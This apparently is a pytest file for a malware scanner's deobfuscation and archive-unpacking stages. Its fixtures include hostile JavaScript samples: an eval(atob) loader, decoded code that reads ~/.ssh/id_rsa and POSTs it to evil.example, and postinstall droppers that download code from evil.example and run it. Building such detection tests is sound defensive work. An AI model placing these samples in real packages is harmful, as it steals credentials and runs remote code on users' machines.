"""The transform seam — the core↔RE-toolset boundary.

Exercised with fake in-repo providers (no unmask-re, no external tools) so the seam
is proven end to end: plan a transform, run a duck-typed provider, rescan what it
recovers, and re-compose — surfacing findings that are invisible until the artifact
is opened up. Also asserts the seam is inert with no provider registered.
"""

from __future__ import annotations

import json
from pathlib import Path

# --- payloads --------------------------------------------------------------

# Obfuscated on its own this is only decode-and-execute (BP-OBFEXEC); the real
# behaviour is hidden until deobfuscated.
_OBFUSCATED_JS = 'const p="Y3VybCBldmls";\neval(atob(p));\n'

# What a deobfuscator would recover — credential theft + exfil (BP-CREDTHEFT/BP-EXFIL),
# none of whose atoms exist in the obfuscated form.
_DECODED_JS = (
    'const http=require("http");\n'
    'const cp=require("child_process");\n'
    'const fs=require("fs");\n'
    'const key=fs.readFileSync(process.env.HOME+"/.ssh/id_rsa");\n'
    'http.request({host:"evil.example",method:"POST"}).end(key);\n'
    'cp.execSync("rm -rf /tmp/x");\n'
)


# --- fake providers (duck-typed; never import unmask-re) --------------------

class FakeDeobfuscator:
    id = "fake-deobf"
    capabilities = ["deobfuscate-js", "deobfuscate"]

    def __init__(self, payload: str):
        self.payload = payload

    def can_handle(self, artifact) -> bool:
        return artifact.kind == "obfuscated-source"

    def transform(self, artifact, workdir):
        from unmask.transform import DerivedSource, TransformResult
        out = Path(workdir) / "deobfuscated"
        out.mkdir(parents=True, exist_ok=True)
        (out / "revealed.js").write_text(self.payload)
        return TransformResult(
            provider_id=self.id, artifact=artifact.logical_path, capability="deobfuscate-js",
            derived=[DerivedSource(root=str(out), origin=f"{artifact.logical_path}»deobf",
                                   method="deobfuscate")])


class FakeTriager:
    """Emits atoms directly (skillpacks emit-atoms) and returns a *plain dict* to
    exercise result coercion from a fully decoupled provider."""
    id = "fake-triage"
    capabilities = ["binary-triage", "emit-atoms"]

    def can_handle(self, artifact) -> bool:
        return True

    def transform(self, artifact, workdir):
        return {
            "artifact": artifact.logical_path, "capability": "binary-triage",
            "atoms": [
                {"atom": "NETW.HTTP", "confidence": 0.8, "method": "bin-triage",
                 "path": "strings", "evidence": "http://evil.example"},
                {"atom": "EXEC.SHELL", "confidence": 0.7, "method": "bin-triage", "path": "strings"},
                {"atom": "BOGUS.NOPE", "confidence": 0.9, "method": "bin-triage", "path": "strings"},
            ],
        }


def _toolchain_with(*providers):
    from unmask.providers import ProviderInfo, ToolchainStatus
    st = ToolchainStatus()
    for p in providers:
        st.providers.append(ProviderInfo(id=p.id, capabilities=list(p.capabilities),
                                         source="test", instance=p))
    return st


# --- ingest ----------------------------------------------------------------

def test_ingest_validates_by_family():
    from unmask.scanner.signatures import Signatures
    from unmask.transform import ingest_atoms
    fams = Signatures.load_vendored().known_families()
    records = [
        {"atom": "netw.http", "confidence": 0.8, "path": "x"},   # lowercased -> normalised
        {"atom": "BOGUS.NOPE", "confidence": 0.9, "path": "x"},  # unknown family -> dropped
        {"atom": "not an atom", "confidence": 0.5, "path": "x"},  # malformed -> dropped
        {"atom": "EXEC.SHELL", "confidence": 5.0, "path": "y"},  # clamped
    ]
    obs, dropped = ingest_atoms(records, origin="app.bin", known_families=fams)
    atoms = {o.atom for o in obs}
    assert atoms == {"NETW.HTTP", "EXEC.SHELL"}
    assert all(o.path.startswith("app.bin!") for o in obs)
    assert max(o.confidence for o in obs) <= 1.0
    assert {d["reason"] for d in dropped} == {"unknown-family", "malformed-atom"}


def test_transform_result_coerces_dict():
    from unmask.transform import TransformResult
    res = TransformResult.coerce(
        {"atoms": [{"atom": "NETW.HTTP", "confidence": 0.5, "path": "s"}],
         "derived": [{"root": "/tmp/x", "origin": "o"}]},
        provider_id="p", artifact="a", capability="c")
    assert res.provider_id == "p" and res.artifact == "a"
    assert res.atoms[0].atom == "NETW.HTTP" and res.derived[0].origin == "o"


# --- plan ------------------------------------------------------------------

def test_plan_requests_deobfuscation_for_obfuscated_source(tmp_path):
    from unmask.scanner.observe import observe
    from unmask.transform import plan_transforms
    tgt = tmp_path / "t"
    tgt.mkdir()
    (tgt / "index.js").write_text(_OBFUSCATED_JS)
    obs, inv = observe(str(tgt))
    reqs = plan_transforms(obs, inv, binary_artifacts=[],
                           capabilities={"deobfuscate-js"}, done=set())
    assert [r.capability for r in reqs] == ["deobfuscate-js"]
    assert reqs[0].artifact.kind == "obfuscated-source"
    # No capability advertised -> no request (honest blind spot, not a crash).
    assert plan_transforms(obs, inv, binary_artifacts=[], capabilities=set(), done=set()) == []


def test_plan_matches_binary_kind_to_capability():
    from unmask.transform import ArtifactRef, plan_transforms
    from unmask.scanner.observe.inventory import Inventory
    art = ArtifactRef(path="/x/a.so", logical_path="a.so", kind="native-binary")
    inv = Inventory(root="/x")
    # decompiler present -> decompile; only triage present -> triage fallback; neither -> nothing.
    assert plan_transforms([], inv, binary_artifacts=[art],
                           capabilities={"decompile-native"}, done=set())[0].capability == "decompile-native"
    assert plan_transforms([], inv, binary_artifacts=[art],
                           capabilities={"binary-triage"}, done=set())[0].capability == "binary-triage"
    assert plan_transforms([], inv, binary_artifacts=[art],
                           capabilities={"deobfuscate"}, done=set()) == []


# --- end to end (through the graph) ----------------------------------------

def test_deobfuscation_reveals_hidden_exfil(tmp_path, monkeypatch):
    import unmask.run as runmod
    from unmask import MCDConfig, run_mcd
    tgt = tmp_path / "tgt"
    tgt.mkdir()
    (tgt / "index.js").write_text(_OBFUSCATED_JS)

    monkeypatch.setattr(runmod, "discover_providers",
                        lambda: _toolchain_with(FakeDeobfuscator(_DECODED_JS)))
    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd")))
    report = json.loads(Path(result.report_paths["json"]).read_text())
    comps = report["summary"].get("compositions") or []
    # These compositions are impossible without deobfuscating the payload.
    assert "BP-EXFIL" in comps or "BP-CREDTHEFT" in comps
    # Provenance is carried back to the artifact that hid the code.
    assert any("»deobf" in t for t in report["transforms"]["transformed"]) or \
           report["transforms"]["transformed"] == ["index.js"]
    assert result.disposition in {"review", "quarantine"}


def test_seam_is_inert_without_a_provider(tmp_path, monkeypatch):
    import unmask.run as runmod
    from unmask import MCDConfig, run_mcd
    from unmask.providers import ToolchainStatus
    tgt = tmp_path / "tgt"
    tgt.mkdir()
    (tgt / "index.js").write_text(_OBFUSCATED_JS)

    monkeypatch.setattr(runmod, "discover_providers", lambda: ToolchainStatus())
    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd")))
    report = json.loads(Path(result.report_paths["json"]).read_text())
    comps = report["summary"].get("compositions") or []
    # The hidden behaviour stays hidden; only the obfuscation itself is flagged.
    assert "BP-OBFEXEC" in comps
    assert "BP-EXFIL" not in comps and "BP-CREDTHEFT" not in comps
    assert "transforms" not in report


def test_emit_atoms_provider_folds_into_findings(tmp_path, monkeypatch):
    import unmask.run as runmod
    from unmask import MCDConfig, run_mcd
    # A native binary the triager emits atoms for (NETW.HTTP + EXEC.SHELL -> a finding),
    # while the bogus atom is dropped on ingest.
    tgt = tmp_path / "tgt"
    tgt.mkdir()
    (tgt / "payload.so").write_bytes(b"\x7fELF" + b"\x00" * 64)

    monkeypatch.setattr(runmod, "discover_providers", lambda: _toolchain_with(FakeTriager()))
    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd")))
    report = json.loads(Path(result.report_paths["json"]).read_text())
    atoms = {a.get("reason") for a in report["transforms"]["droppedAtoms"]}
    assert "unknown-family" in atoms  # BOGUS.NOPE rejected
    assert "payload.so" in report["transforms"]["transformed"]


# --- the real skill provider (unmask-re) ----------------------------------
# These exercise the actual vendored skills through the transform seam. They need
# the unmask-re package importable (it is in the workspace) and the skill's
# prerequisites on PATH. Skills whose prereqs are missing are skipped — the whole
# point of prereq-gating is that a missing tool is an honest blind spot, not a
# test failure.

def _has_unmask_re() -> bool:
    try:
        import unmask_re  # noqa: F401
        return True
    except ImportError:
        return False


def test_skill_provider_advertises_only_prereq_satisfied_capabilities():
    """A skill whose external tool is missing must NOT advertise its capability —
    that is the honest-blind-spot contract. With no jadx/ilspycmd on a typical CI
    host, decompile-jvm/decompile-dotnet are absent while pure-stdlib skills are
    present."""
    if not _has_unmask_re():
        import pytest
        pytest.skip("unmask-re not importable")
    from unmask_re.provider import SkillTransformProvider, _resolved_skills
    p = SkillTransformProvider()
    # Pure-stdlib skills are always available (python3 is the runner's only prereq).
    assert "unpack-archive" in p.capabilities
    assert "scan-secrets" in p.capabilities
    # JVM/.NET decompilers are BYO-tool: they only advertise when jadx/ilspycmd
    # resolve. On a clean host they must be absent (the honest blind spot).
    jvm = [s for s in _resolved_skills() if s.id == "jvm-decompile"][0]
    if jvm.missing_prereqs:
        assert "decompile-jvm" not in p.capabilities


def test_skill_provider_unpacks_a_real_archive(tmp_path):
    """The real `unpack` skill opens a zip core can't read, and the rescanned
    contents become MCD findings. End-to-end proof the skill seam is wired."""
    if not _has_unmask_re():
        import pytest
        pytest.skip("unmask-re not importable")
    import zipfile
    from unmask_re.provider import SkillTransformProvider
    from unmask.transform.contract import ArtifactRef
    # A zip with a payload that will produce findings once revealed.
    zip_path = tmp_path / "pkg.zip"
    with zipfile.ZipFile(zip_path, "w") as z:
        z.writestr("postinstall.js",
                   'const https=require("https");const cp=require("child_process");\n'
                   'https.get("https://evil.example/c2",(r)=>{let b="";'
                   'r.on("data",c=>b+=c);r.on("end",()=>cp.execSync(b));});\n')
    p = SkillTransformProvider()
    art = ArtifactRef(path=str(zip_path), logical_path="pkg.zip", kind="archive")
    assert p.can_handle(art), "unpack skill should handle an archive"
    import os
    workdir = str(tmp_path / "work")
    res = p.transform(art, workdir)
    assert not res.error, f"unpack failed: {res.error}"
    assert res.derived, "unpack produced no recovered source roots"
    # The revealed postinstall.js must exist under one of the derived roots.
    revealed = []
    for d in res.derived:
        for root, _, files in os.walk(d.root):
            revealed += [os.path.join(root, f) for f in files]
    assert any("postinstall.js" in r for r in revealed), \
        f"postinstall.js not revealed by unpack; got {revealed}"


def test_unpack_skill_drives_scan_to_findings(tmp_path):
    """Full pipeline: a zip that core can't read scans clean, but with unmask-re's
    unpack skill the contents are revealed and the hidden dropper surfaces."""
    if not _has_unmask_re():
        import pytest
        pytest.skip("unmask-re not importable")
    import zipfile
    from unmask import MCDConfig, run_mcd
    tgt = tmp_path / "tgt"
    tgt.mkdir()
    with zipfile.ZipFile(tgt / "bundle.zip", "w") as z:
        z.writestr("postinstall.js",
                   'const https=require("https");const fs=require("fs");'
                   'const cp=require("child_process");\n'
                   'https.get("https://evil.example/payload",(r)=>{let b="";'
                   'r.on("data",c=>b+=c);r.on("end",()=>{'
                   'fs.writeFileSync("/tmp/.x",b);cp.execSync("/tmp/.x");});});\n')
    result = run_mcd(str(tgt), MCDConfig(storage_root=str(tmp_path / ".mcd")))
    report = json.loads(Path(result.report_paths["json"]).read_text())
    # The revealed dropper should drive at least a review (fetch+exec), and the
    # transform section should record the unpack.
    assert report.get("transforms"), "no transform ran on the archive"
    assert "bundle.zip" in report["transforms"]["transformed"] or \
           any("bundle.zip" in t for t in report["transforms"]["transformed"])
    assert report["summary"]["findingCount"] >= 1
